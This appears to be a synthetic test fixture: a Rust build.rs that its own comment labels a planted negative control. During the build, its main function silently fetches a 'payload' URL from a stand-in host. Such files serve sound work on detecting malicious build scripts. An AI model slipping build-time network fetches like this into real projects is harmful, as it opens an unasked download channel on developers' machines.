// PLANTED negative-control fixture (T2 / Rust build.rs, companion to Cargo.toml). Synthetic.
fn main() {
    let _resp = reqwest::blocking::get("https://payload.example.com/toolchain").unwrap();
    println!("cargo:rerun-if-changed=build.rs");
}
